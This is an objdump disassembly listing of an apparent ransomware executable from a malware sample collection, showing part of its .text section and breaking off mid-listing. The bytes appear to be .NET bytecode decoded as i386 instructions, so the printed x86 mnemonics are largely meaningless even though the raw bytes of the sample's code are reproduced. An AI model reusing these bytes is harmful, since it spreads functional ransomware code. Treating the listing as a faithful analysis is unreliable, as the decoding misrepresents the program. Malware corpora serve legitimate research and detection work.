
malware_samples/ransomware/31e1948d4e15f5eebeeb8c43d57ae0398b39d0edea908df6bcd6e032bbdb93e5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	20 69 00             	and    %ch,0x0(%ecx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 10 3b 00       	add    $0x3b1000,%eax
  402013:	00 e0                	add    %ah,%al
  402015:	2d 00 00 01 00       	sub    $0x10000,%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	02 00                	add    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1a 28                	sbb    (%eax),%ch
  402052:	03 00                	add    (%eax),%eax
  402054:	00 06                	add    %al,(%esi)
  402056:	2a 00                	sub    (%eax),%al
  402058:	03 30                	add    (%eax),%esi
  40205a:	02 00                	add    (%eax),%al
  40205c:	c1 00 00             	roll   $0x0,(%eax)
  40205f:	00 00                	add    %al,(%eax)
  402061:	00 00                	add    %al,(%eax)
  402063:	00 28                	add    %ch,(%eax)
  402065:	05 00 00 06 2c       	add    $0x2c060000,%eax
  40206a:	06                   	push   %es
  40206b:	17                   	pop    %ss
  40206c:	28 06                	sub    %al,(%esi)
  40206e:	00 00                	add    %al,(%eax)
  402070:	0a 7e 0c             	or     0xc(%esi),%bh
  402073:	00 00                	add    %al,(%eax)
  402075:	04 2c                	add    $0x2c,%al
  402077:	05 28 04 00 00       	add    $0x428,%eax
  40207c:	06                   	push   %es
  40207d:	7e 11                	jle    0x402090
  40207f:	00 00                	add    %al,(%eax)
  402081:	04 2c                	add    $0x2c,%al
  402083:	0c 7e                	or     $0x7e,%al
  402085:	09 00                	or     %eax,(%eax)
  402087:	00 04 28             	add    %al,(%eax,%ebp,1)
  40208a:	13 00                	adc    (%eax),%eax
  40208c:	00 06                	add    %al,(%esi)
  40208e:	2b 11                	sub    (%ecx),%edx
  402090:	7e 08                	jle    0x40209a
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2c                	add    $0x2c,%al
  402096:	0a 7e 09             	or     0x9(%esi),%bh
  402099:	00 00                	add    %al,(%eax)
  40209b:	04 28                	add    $0x28,%al
  40209d:	12 00                	adc    (%eax),%al
  40209f:	00 06                	add    %al,(%esi)
  4020a1:	7e 0b                	jle    0x4020ae
  4020a3:	00 00                	add    %al,(%eax)
  4020a5:	04 2c                	add    $0x2c,%al
  4020a7:	05 28 14 00 00       	add    $0x1428,%eax
  4020ac:	06                   	push   %es
  4020ad:	28 11                	sub    %dl,(%ecx)
  4020af:	00 00                	add    %al,(%eax)
  4020b1:	06                   	push   %es
  4020b2:	7e 11                	jle    0x4020c5
  4020b4:	00 00                	add    %al,(%eax)
  4020b6:	04 2c                	add    $0x2c,%al
  4020b8:	24 7e                	and    $0x7e,%al
  4020ba:	12 00                	adc    (%eax),%al
  4020bc:	00 04 2c             	add    %al,(%esp,%ebp,1)
  4020bf:	05 28 19 00 00       	add    $0x1928,%eax
  4020c4:	06                   	push   %es
  4020c5:	7e 13                	jle    0x4020da
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	04 2c                	add    $0x2c,%al
  4020cb:	05 28 1a 00 00       	add    $0x1a28,%eax
  4020d0:	06                   	push   %es
  4020d1:	7e 14                	jle    0x4020e7
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	04 2c                	add    $0x2c,%al
  4020d7:	05 28 1b 00 00       	add    $0x1b28,%eax
  4020dc:	06                   	push   %es
  4020dd:	7e 06                	jle    0x4020e5
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	04 2c                	add    $0x2c,%al
  4020e3:	0a 7e 07             	or     0x7(%esi),%bh
  4020e6:	00 00                	add    %al,(%eax)
  4020e8:	04 28                	add    $0x28,%al
  4020ea:	17                   	pop    %ss
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	06                   	push   %es
  4020ee:	28 15 00 00 06 7e    	sub    %dl,0x7e060000
  4020f4:	0e                   	push   %cs
  4020f5:	00 00                	add    %al,(%eax)
  4020f7:	04 28                	add    $0x28,%al
  4020f9:	1c 00                	sbb    $0x0,%al
  4020fb:	00 06                	add    %al,(%esi)
  4020fd:	7e 1d                	jle    0x40211c
  4020ff:	00 00                	add    %al,(%eax)
  402101:	04 2d                	add    $0x2d,%al
  402103:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402106:	06                   	push   %es
  402107:	1e                   	push   %ds
  402108:	00 00                	add    %al,(%eax)
  40210a:	06                   	push   %es
  40210b:	73 07                	jae    0x402114
  40210d:	00 00                	add    %al,(%eax)
  40210f:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  402115:	7e 1d                	jle    0x402134
  402117:	00 00                	add    %al,(%eax)
  402119:	04 73                	add    $0x73,%al
  40211b:	08 00                	or     %al,(%eax)
  40211d:	00 0a                	add    %cl,(%edx)
  40211f:	28 09                	sub    %cl,(%ecx)
  402121:	00 00                	add    %al,(%eax)
  402123:	0a 2a                	or     (%edx),%ch
  402125:	2e 73 24             	jae,pn 0x40214c
  402128:	00 00                	add    %al,(%eax)
  40212a:	06                   	push   %es
  40212b:	28 0a                	sub    %cl,(%edx)
  40212d:	00 00                	add    %al,(%eax)
  40212f:	0a 2a                	or     (%edx),%ch
  402131:	00 00                	add    %al,(%eax)
  402133:	00 13                	add    %dl,(%ebx)
  402135:	30 02                	xor    %al,(%edx)
  402137:	00 32                	add    %dh,(%edx)
  402139:	00 00                	add    %al,(%eax)
  40213b:	00 01                	add    %al,(%ecx)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 28                	adc    %ebp,(%eax)
  402141:	0b 00                	or     (%eax),%eax
  402143:	00 0a                	add    %cl,(%edx)
  402145:	6f                   	outsl  %ds:(%esi),(%dx)
  402146:	0c 00                	or     $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	28 0d 00 00 0a 0a    	sub    %cl,0xa0a0000
  402150:	1f                   	pop    %ds
  402151:	1a 28                	sbb    (%eax),%ch
  402153:	0e                   	push   %cs
  402154:	00 00                	add    %al,(%eax)
  402156:	0a 0b                	or     (%ebx),%cl
  402158:	06                   	push   %es
  402159:	07                   	pop    %es
  40215a:	28 0f                	sub    %cl,(%edi)
  40215c:	00 00                	add    %al,(%eax)
  40215e:	0a 2c 10             	or     (%eax,%edx,1),%ch
  402161:	7e 0d                	jle    0x402170
  402163:	00 00                	add    %al,(%eax)
  402165:	04 20                	add    $0x20,%al
  402167:	e8 03 00 00 5a       	call   0x5a40216f
  40216c:	28 10                	sub    %dl,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	0a 2a                	or     (%edx),%ch
  402172:	00 00                	add    %al,(%eax)
  402174:	1b 30                	sbb    (%eax),%esi
  402176:	02 00                	add    (%eax),%al
  402178:	65 00 00             	add    %al,%gs:(%eax)
  40217b:	00 02                	add    %al,(%edx)
  40217d:	00 00                	add    %al,(%eax)
  40217f:	11 28                	adc    %ebp,(%eax)
  402181:	11 00                	adc    %eax,(%eax)
  402183:	00 0a                	add    %cl,(%edx)
  402185:	0a 28                	or     (%eax),%ch
  402187:	12 00                	adc    (%eax),%al
  402189:	00 0a                	add    %cl,(%edx)
  40218b:	0b 06                	or     (%esi),%eax
  40218d:	13 04 16             	adc    (%esi,%edx,1),%eax
  402190:	13 05 2b 45 11 04    	adc    0x411452b,%eax
  402196:	11 05 9a 0c 08 6f    	adc    %eax,0x6f080c9a
  40219c:	13 00                	adc    (%eax),%eax
  40219e:	00 0a                	add    %cl,(%edx)
  4021a0:	16                   	push   %ss
  4021a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a2:	14 00                	adc    $0x0,%al
  4021a4:	00 0a                	add    %cl,(%edx)
  4021a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a7:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  4021ac:	16                   	push   %ss
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	0a 6f 0c             	or     0xc(%edi),%ch
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	0a 28                	or     (%eax),%ch
  4021b6:	17                   	pop    %ss
  4021b7:	00 00                	add    %al,(%eax)
  4021b9:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4021bc:	07                   	pop    %es
  4021bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021be:	18 00                	sbb    %al,(%eax)
  4021c0:	00 0a                	add    %cl,(%edx)
  4021c2:	08 6f 18             	or     %ch,0x18(%edi)
  4021c5:	00 00                	add    %al,(%eax)
  4021c7:	0a 2e                	or     (%esi),%ch
  4021c9:	04 17                	add    $0x17,%al
  4021cb:	0d de 15 de 03       	or     $0x3de15de,%eax
  4021d0:	26 de 00             	fiadds %es:(%eax)
  4021d3:	11 05 17 58 13 05    	adc    %eax,0x5135817
  4021d9:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  4021df:	32 b3 16 2a 09 2a    	xor    0x2a092a16(%ebx),%dh
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	00 01                	add    %al,(%ecx)
  4021e9:	10 00                	adc    %al,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 1a                	add    %bl,(%edx)
  4021ef:	00 36                	add    %dh,(%esi)
  4021f1:	50                   	push   %eax
  4021f2:	00 03                	add    %al,(%ebx)
  4021f4:	18 00                	sbb    %al,(%eax)
  4021f6:	00 01                	add    %al,(%ecx)
  4021f8:	13 30                	adc    (%eax),%esi
  4021fa:	02 00                	add    (%eax),%al
  4021fc:	1b 00                	sbb    (%eax),%eax
  4021fe:	00 00                	add    %al,(%eax)
  402200:	03 00                	add    (%eax),%eax
  402202:	00 11                	add    %dl,(%ecx)
  402204:	73 19                	jae    0x40221f
  402206:	00 00                	add    %al,(%eax)
  402208:	0a 0a                	or     (%edx),%cl
  40220a:	02 17                	add    (%edi),%dl
  40220c:	58                   	pop    %eax
  40220d:	10 00                	adc    %al,(%eax)
  40220f:	02 8d 19 00 00 01    	add    0x1000019(%ebp),%cl
  402215:	0b 06                	or     (%esi),%eax
  402217:	07                   	pop    %es
  402218:	6f                   	outsl  %ds:(%esi),(%dx)
  402219:	1a 00                	sbb    (%eax),%al
  40221b:	00 0a                	add    %cl,(%edx)
  40221d:	07                   	pop    %es
  40221e:	2a 00                	sub    (%eax),%al
  402220:	13 30                	adc    (%eax),%esi
  402222:	04 00                	add    $0x0,%al
  402224:	41                   	inc    %ecx
  402225:	00 00                	add    %al,(%eax)
  402227:	00 04 00             	add    %al,(%eax,%eax,1)
  40222a:	00 11                	add    %dl,(%ecx)
  40222c:	73 1b                	jae    0x402249
  40222e:	00 00                	add    %al,(%eax)
  402230:	0a 0a                	or     (%edx),%cl
  402232:	16                   	push   %ss
  402233:	0b 2b                	or     (%ebx),%ebp
  402235:	2c 72                	sub    $0x72,%al
  402237:	01 00                	add    %eax,(%eax)
  402239:	00 70 7e             	add    %dh,0x7e(%eax)
  40223c:	1c 00                	sbb    $0x0,%al
  40223e:	00 04 16             	add    %al,(%esi,%edx,1)
  402241:	72 01                	jb     0x402244
  402243:	00 00                	add    %al,(%eax)
  402245:	70 6f                	jo     0x4022b6
  402247:	1c 00                	sbb    $0x0,%al
  402249:	00 0a                	add    %cl,(%edx)
  40224b:	6f                   	outsl  %ds:(%esi),(%dx)
  40224c:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402251:	1e                   	push   %ds
  402252:	00 00                	add    %al,(%eax)
  402254:	0a 0c 06             	or     (%esi,%eax,1),%cl
  402257:	08 6f 1f             	or     %ch,0x1f(%edi)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 26                	or     (%esi),%ah
  40225e:	07                   	pop    %es
  40225f:	17                   	pop    %ss
  402260:	58                   	pop    %eax
  402261:	0b 07                	or     (%edi),%eax
  402263:	02 32                	add    (%edx),%dh
  402265:	d0 06                	rolb   $1,(%esi)
  402267:	6f                   	outsl  %ds:(%esi),(%dx)
  402268:	20 00                	and    %al,(%eax)
  40226a:	00 0a                	add    %cl,(%edx)
  40226c:	2a 00                	sub    (%eax),%al
  40226e:	00 00                	add    %al,(%eax)
  402270:	13 30                	adc    (%eax),%esi
  402272:	04 00                	add    $0x0,%al
  402274:	58                   	pop    %eax
  402275:	00 00                	add    %al,(%eax)
  402277:	00 04 00             	add    %al,(%eax,%eax,1)
  40227a:	00 11                	add    %dl,(%ecx)
  40227c:	7e 05                	jle    0x402283
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 72                	add    $0x72,%al
  402282:	4b                   	dec    %ebx
  402283:	00 00                	add    %al,(%eax)
  402285:	70 28                	jo     0x4022af
  402287:	17                   	pop    %ss
  402288:	00 00                	add    %al,(%eax)
  40228a:	0a 2c 41             	or     (%ecx,%eax,2),%ch
  40228d:	73 1b                	jae    0x4022aa
  40228f:	00 00                	add    %al,(%eax)
  402291:	0a 0a                	or     (%edx),%cl
  402293:	16                   	push   %ss
  402294:	0b 2b                	or     (%ebx),%ebp
  402296:	2c 72                	sub    $0x72,%al
  402298:	01 00                	add    %eax,(%eax)
  40229a:	00 70 7e             	add    %dh,0x7e(%eax)
  40229d:	1c 00                	sbb    $0x0,%al
  40229f:	00 04 16             	add    %al,(%esi,%edx,1)
  4022a2:	72 01                	jb     0x4022a5
  4022a4:	00 00                	add    %al,(%eax)
  4022a6:	70 6f                	jo     0x402317
  4022a8:	1c 00                	sbb    $0x0,%al
  4022aa:	00 0a                	add    %cl,(%edx)
  4022ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ad:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  4022b2:	1e                   	push   %ds
  4022b3:	00 00                	add    %al,(%eax)
  4022b5:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4022b8:	08 6f 1f             	or     %ch,0x1f(%edi)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	0a 26                	or     (%esi),%ah
  4022bf:	07                   	pop    %es
  4022c0:	17                   	pop    %ss
  4022c1:	58                   	pop    %eax
  4022c2:	0b 07                	or     (%edi),%eax
  4022c4:	02 32                	add    (%edx),%dh
  4022c6:	d0 06                	rolb   $1,(%esi)
  4022c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4022c9:	20 00                	and    %al,(%eax)
  4022cb:	00 0a                	add    %cl,(%edx)
  4022cd:	2a 7e 05             	sub    0x5(%esi),%bh
  4022d0:	00 00                	add    %al,(%eax)
  4022d2:	04 2a                	add    $0x2a,%al
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	13 00                	adc    (%eax),%eax
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	05 00 00 11 28       	add    $0x28110000,%eax
  4022e1:	21 00                	and    %eax,(%eax)
  4022e3:	00 0a                	add    %cl,(%edx)
  4022e5:	02 6f 22             	add    0x22(%edi),%ch
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	0a 0a                	or     (%edx),%cl
  4022ec:	06                   	push   %es
  4022ed:	28 23                	sub    %ah,(%ebx)
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	0a 2a                	or     (%edx),%ch
  4022f3:	00 13                	add    %dl,(%ebx)
  4022f5:	30 03                	xor    %al,(%ebx)
  4022f7:	00 4b 00             	add    %cl,0x0(%ebx)
  4022fa:	00 00                	add    %al,(%eax)
  4022fc:	06                   	push   %es
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	11 28                	adc    %ebp,(%eax)
  402301:	21 00                	and    %eax,(%eax)
  402303:	00 0a                	add    %cl,(%edx)
  402305:	02 6f 22             	add    0x22(%edi),%ch
  402308:	00 00                	add    %al,(%eax)
  40230a:	0a 0a                	or     (%edx),%cl
  40230c:	1b 8d 14 00 00 01    	sbb    0x1000014(%ebp),%ecx
  402312:	0b 07                	or     (%edi),%eax
  402314:	16                   	push   %ss
  402315:	72 4d                	jb     0x402364
  402317:	00 00                	add    %al,(%eax)
  402319:	70 a2                	jo     0x4022bd
  40231b:	07                   	pop    %es
  40231c:	17                   	pop    %ss
  40231d:	1f                   	pop    %ds
  40231e:	29 28                	sub    %ebp,(%eax)
  402320:	07                   	pop    %es
  402321:	00 00                	add    %al,(%eax)
  402323:	06                   	push   %es
  402324:	28 09                	sub    %cl,(%ecx)
  402326:	00 00                	add    %al,(%eax)
  402328:	06                   	push   %es
  402329:	a2 07 18 72 69       	mov    %al,0x69721807
  40232e:	00 00                	add    %al,(%eax)
  402330:	70 a2                	jo     0x4022d4
  402332:	07                   	pop    %es
  402333:	19 18                	sbb    %ebx,(%eax)
  402335:	28 07                	sub    %al,(%edi)
  402337:	00 00                	add    %al,(%eax)
  402339:	06                   	push   %es
  40233a:	a2 07 1a 06 28       	mov    %al,0x28061a07
  40233f:	23 00                	and    (%eax),%eax
  402341:	00 0a                	add    %cl,(%edx)
  402343:	a2 07 28 24 00       	mov    %al,0x242807
  402348:	00 0a                	add    %cl,(%edx)
  40234a:	2a 1e                	sub    (%esi),%bl
  40234c:	02 28                	add    (%eax),%ch
  40234e:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  402353:	4a                   	dec    %edx
  402354:	03 02                	add    (%edx),%eax
  402356:	7b 21                	jnp    0x402379
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	26 00 00             	add    %al,%es:(%eax)
  40235f:	0a 28                	or     (%eax),%ch
  402361:	17                   	pop    %ss
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 2a                	or     (%edx),%ch
  402366:	00 00                	add    %al,(%eax)
  402368:	1b 30                	sbb    (%eax),%esi
  40236a:	04 00                	add    $0x0,%al
  40236c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40236d:	01 00                	add    %eax,(%eax)
  40236f:	00 07                	add    %al,(%edi)
  402371:	00 00                	add    %al,(%eax)
  402373:	11 02                	adc    %eax,(%edx)
  402375:	28 27                	sub    %ah,(%edi)
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 0a                	or     (%edx),%cl
  40237b:	17                   	pop    %ss
  40237c:	0b 16                	or     (%esi),%edx
  40237e:	0c 38                	or     $0x38,%al
  402380:	60                   	pusha
  402381:	01 00                	add    %eax,(%eax)
  402383:	00 73 2b             	add    %dh,0x2b(%ebx)
  402386:	00 00                	add    %al,(%eax)
  402388:	06                   	push   %es
  402389:	13 09                	adc    (%ecx),%ecx
  40238b:	11 09                	adc    %ecx,(%ecx)
  40238d:	06                   	push   %es
  40238e:	08 9a 28 28 00 00    	or     %bl,0x2828(%edx)
  402394:	0a 7d 21             	or     0x21(%ebp),%bh
  402397:	00 00                	add    %al,(%eax)
  402399:	04 06                	add    $0x6,%al
  40239b:	08 9a 28 29 00 00    	or     %bl,0x2928(%edx)
  4023a1:	0a 0d 7e 1b 00 00    	or     0x1b7e,%cl
  4023a7:	04 11                	add    $0x11,%al
  4023a9:	09 fe                	or     %edi,%esi
  4023ab:	06                   	push   %es
  4023ac:	2c 00                	sub    $0x0,%al
  4023ae:	00 06                	add    %al,(%esi)
  4023b0:	73 2a                	jae    0x4023dc
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	0a 28                	or     (%eax),%ch
  4023b6:	01 00                	add    %eax,(%eax)
  4023b8:	00 2b                	add    %ch,(%ebx)
  4023ba:	39 1c 01             	cmp    %ebx,(%ecx,%eax,1)
  4023bd:	00 00                	add    %al,(%eax)
  4023bf:	09 7e 10             	or     %edi,0x10(%esi)
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	04 28                	add    $0x28,%al
  4023c6:	0f 00 00             	sldt   (%eax)
  4023c9:	0a 39                	or     (%ecx),%bh
  4023cb:	0c 01                	or     $0x1,%al
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	06                   	push   %es
  4023d0:	08 9a 73 2c 00 00    	or     %bl,0x2c73(%edx)
  4023d6:	0a 13                	or     (%ebx),%dl
  4023d8:	04 11                	add    $0x11,%al
  4023da:	04 20                	add    $0x20,%al
  4023dc:	80 00 00             	addb   $0x0,(%eax)
  4023df:	00 6f 2d             	add    %ch,0x2d(%edi)
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	0a 11                	or     (%ecx),%dl
  4023e6:	04 6f                	add    $0x6f,%al
  4023e8:	2e 00 00             	add    %al,%cs:(%eax)
  4023eb:	0a 20                	or     (%eax),%ah
  4023ed:	20 4e 20             	and    %cl,0x20(%esi)
  4023f0:	00 6a 2f             	add    %ch,0x2f(%edx)
  4023f3:	17                   	pop    %ss
  4023f4:	7e 04                	jle    0x4023fa
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	04 39                	add    $0x39,%al
  4023fa:	be 00 00 00 06       	mov    $0x6000000,%esi
  4023ff:	08 9a 28 0f 00 00    	or     %bl,0xf28(%edx)
  402405:	06                   	push   %es
  402406:	38 b1 00 00 00 11    	cmp    %dh,0x11000000(%ecx)
  40240c:	04 6f                	add    $0x6f,%al
  40240e:	2e 00 00             	add    %al,%cs:(%eax)
  402411:	0a 20                	or     (%eax),%ah
  402413:	00 c2                	add    %al,%dl
  402415:	eb 0b                	jmp    0x402422
  402417:	6a 31                	push   $0x31
  402419:	59                   	pop    %ecx
  40241a:	73 19                	jae    0x402435
  40241c:	00 00                	add    %al,(%eax)
  40241e:	0a 13                	or     (%ebx),%dl
  402420:	05 11 05 20 00       	add    $0x200511,%eax
  402425:	c2 eb 0b             	ret    $0xbeb
  402428:	20 00                	and    %al,(%eax)
  40242a:	a3 e1 11 6f 1d       	mov    %eax,0x1d6f11e1
  40242f:	00 00                	add    %al,(%eax)
  402431:	0a 13                	or     (%ebx),%dl
  402433:	06                   	push   %es
  402434:	28 21                	sub    %ah,(%ecx)
  402436:	00 00                	add    %al,(%eax)
  402438:	0a 11                	or     (%ecx),%dl
  40243a:	06                   	push   %es
  40243b:	28 06                	sub    %al,(%esi)
  40243d:	00 00                	add    %al,(%eax)
  40243f:	06                   	push   %es
  402440:	6f                   	outsl  %ds:(%esi),(%dx)
  402441:	2f                   	das
  402442:	00 00                	add    %al,(%eax)
  402444:	0a 13                	or     (%ebx),%dl
  402446:	07                   	pop    %es
  402447:	06                   	push   %es
  402448:	08 9a 11 07 28 0a    	or     %bl,0xa280711(%edx)
  40244e:	00 00                	add    %al,(%eax)
  402450:	06                   	push   %es
  402451:	28 30                	sub    %dh,(%eax)
  402453:	00 00                	add    %al,(%eax)
  402455:	0a 06                	or     (%esi),%al
  402457:	08 9a 06 08 9a 72    	or     %bl,0x729a0806(%edx)
  40245d:	87 00                	xchg   %eax,(%eax)
  40245f:	00 70 1a             	add    %dh,0x1a(%eax)
  402462:	28 08                	sub    %cl,(%eax)
  402464:	00 00                	add    %al,(%eax)
  402466:	06                   	push   %es
  402467:	28 31                	sub    %dh,(%ecx)
  402469:	00 00                	add    %al,(%eax)
  40246b:	0a 28                	or     (%eax),%ch
  40246d:	32 00                	xor    (%eax),%al
  40246f:	00 0a                	add    %cl,(%edx)
  402471:	2b 49 28             	sub    0x28(%ecx),%ecx
  402474:	21 00                	and    %eax,(%eax)
  402476:	00 0a                	add    %cl,(%edx)
  402478:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40247b:	2e 00 00             	add    %al,%cs:(%eax)
  40247e:	0a 28                	or     (%eax),%ch
  402480:	33 00                	xor    (%eax),%eax
  402482:	00 0a                	add    %cl,(%edx)
  402484:	1a 5b 28             	sbb    0x28(%ebx),%bl
  402487:	06                   	push   %es
  402488:	00 00                	add    %al,(%eax)
  40248a:	06                   	push   %es
  40248b:	6f                   	outsl  %ds:(%esi),(%dx)
  40248c:	2f                   	das
  40248d:	00 00                	add    %al,(%eax)
  40248f:	0a 13                	or     (%ebx),%dl
  402491:	08 06                	or     %al,(%esi)
  402493:	08 9a 11 08 28 0a    	or     %bl,0xa280811(%edx)
  402499:	00 00                	add    %al,(%eax)
  40249b:	06                   	push   %es
  40249c:	28 30                	sub    %dh,(%eax)
  40249e:	00 00                	add    %al,(%eax)
  4024a0:	0a 06                	or     (%esi),%al
  4024a2:	08 9a 06 08 9a 72    	or     %bl,0x729a0806(%edx)
  4024a8:	87 00                	xchg   %eax,(%eax)
  4024aa:	00 70 1a             	add    %dh,0x1a(%eax)
  4024ad:	28 08                	sub    %cl,(%eax)
  4024af:	00 00                	add    %al,(%eax)
  4024b1:	06                   	push   %es
  4024b2:	28 31                	sub    %dh,(%ecx)
  4024b4:	00 00                	add    %al,(%eax)
  4024b6:	0a 28                	or     (%eax),%ch
  4024b8:	32 00                	xor    (%eax),%al
  4024ba:	00 0a                	add    %cl,(%edx)
  4024bc:	07                   	pop    %es
  4024bd:	2c 1c                	sub    $0x1c,%al
  4024bf:	16                   	push   %ss
  4024c0:	0b 02                	or     (%edx),%eax
  4024c2:	72 8b                	jb     0x40244f
  4024c4:	00 00                	add    %al,(%eax)
  4024c6:	70 7e                	jo     0x402546
  4024c8:	10 00                	adc    %al,(%eax)
  4024ca:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024cd:	31 00                	xor    %eax,(%eax)
  4024cf:	00 0a                	add    %cl,(%edx)
  4024d1:	7e 1a                	jle    0x4024ed
  4024d3:	00 00                	add    %al,(%eax)
  4024d5:	04 28                	add    $0x28,%al
  4024d7:	34 00                	xor    $0x0,%al
  4024d9:	00 0a                	add    %cl,(%edx)
  4024db:	de 03                	fiadds (%ebx)
  4024dd:	26 de 00             	fiadds %es:(%eax)
  4024e0:	08 17                	or     %dl,(%edi)
  4024e2:	58                   	pop    %eax
  4024e3:	0c 08                	or     $0x8,%al
  4024e5:	06                   	push   %es
  4024e6:	8e 69 3f             	mov    0x3f(%ecx),%gs
  4024e9:	97                   	xchg   %eax,%edi
  4024ea:	fe                   	(bad)
  4024eb:	ff                   	(bad)
  4024ec:	ff 02                	incl   (%edx)
  4024ee:	28 35 00 00 0a 13    	sub    %dh,0x130a0000
  4024f4:	0a 16                	or     (%esi),%dl
  4024f6:	13 0b                	adc    (%ebx),%ecx
  4024f8:	2b 10                	sub    (%eax),%edx
  4024fa:	11 0a                	adc    %ecx,(%edx)
  4024fc:	11 0b                	adc    %ecx,(%ebx)
  4024fe:	9a 28 0b 00 00 06 11 	lcall  $0x1106,$0xb28
  402505:	0b 17                	or     (%edi),%edx
  402507:	58                   	pop    %eax
  402508:	13 0b                	adc    (%ebx),%ecx
  40250a:	11 0b                	adc    %ecx,(%ebx)
  40250c:	11 0a                	adc    %ecx,(%edx)
  40250e:	8e 69 32             	mov    0x32(%ecx),%gs
  402511:	e8 de 03 26 de       	call   0xde6628f4
  402516:	00 2a                	add    %ch,(%edx)
  402518:	41                   	inc    %ecx
  402519:	34 00                	xor    $0x0,%al
  40251b:	00 00                	add    %al,(%eax)
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 10                	add    %dl,(%eax)
  402521:	00 00                	add    %al,(%eax)
  402523:	00 59 01             	add    %bl,0x1(%ecx)
  402526:	00 00                	add    %al,(%eax)
  402528:	69 01 00 00 03 00    	imul   $0x30000,(%ecx),%eax
  40252e:	00 00                	add    %al,(%eax)
  402530:	01 00                	add    %eax,(%eax)
  402532:	00 01                	add    %al,(%ecx)
	...
  40253c:	a0 01 00 00 a0       	mov    0xa0000001,%al
  402541:	01 00                	add    %eax,(%eax)
  402543:	00 03                	add    %al,(%ebx)
  402545:	00 00                	add    %al,(%eax)
  402547:	00 18                	add    %bl,(%eax)
  402549:	00 00                	add    %al,(%eax)
  40254b:	01 13                	add    %edx,(%ebx)
  40254d:	30 01                	xor    %al,(%ecx)
  40254f:	00 0d 00 00 00 08    	add    %cl,0x8000000
  402555:	00 00                	add    %al,(%eax)
  402557:	11 73 1b             	adc    %esi,0x1b(%ebx)
  40255a:	00 00                	add    %al,(%eax)
  40255c:	0a 0a                	or     (%edx),%cl
  40255e:	06                   	push   %es
  40255f:	6f                   	outsl  %ds:(%esi),(%dx)
  402560:	20 00                	and    %al,(%eax)
  402562:	00 0a                	add    %cl,(%edx)
  402564:	2a 00                	sub    (%eax),%al
  402566:	00 00                	add    %al,(%eax)
  402568:	13 30                	adc    (%eax),%esi
  40256a:	04 00                	add    $0x0,%al
  40256c:	3f                   	aas
  40256d:	00 00                	add    %al,(%eax)
  40256f:	00 09                	add    %cl,(%ecx)
  402571:	00 00                	add    %al,(%eax)
  402573:	11 73 1b             	adc    %esi,0x1b(%ebx)
  402576:	00 00                	add    %al,(%eax)
  402578:	0a 0a                	or     (%edx),%cl
  40257a:	73 19                	jae    0x402595
  40257c:	00 00                	add    %al,(%eax)
  40257e:	0a 0b                	or     (%ebx),%cl
  402580:	2b 21                	sub    (%ecx),%esp
  402582:	06                   	push   %es
  402583:	72 8f                	jb     0x402514
  402585:	00 00                	add    %al,(%eax)
  402587:	70 07                	jo     0x402590
  402589:	72 8f                	jb     0x40251a
  40258b:	00 00                	add    %al,(%eax)
  40258d:	70 6f                	jo     0x4025fe
  40258f:	1c 00                	sbb    $0x0,%al
  402591:	00 0a                	add    %cl,(%edx)
  402593:	6f                   	outsl  %ds:(%esi),(%dx)
  402594:	36 00 00             	add    %al,%ss:(%eax)
  402597:	0a 6f 1e             	or     0x1e(%edi),%ch
  40259a:	00 00                	add    %al,(%eax)
  40259c:	0a 6f 1f             	or     0x1f(%edi),%ch
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	0a 26                	or     (%esi),%ah
  4025a3:	16                   	push   %ss
  4025a4:	02 25 17 59 10 00    	add    0x105917,%ah
  4025aa:	32 d6                	xor    %dh,%dl
  4025ac:	06                   	push   %es
  4025ad:	6f                   	outsl  %ds:(%esi),(%dx)
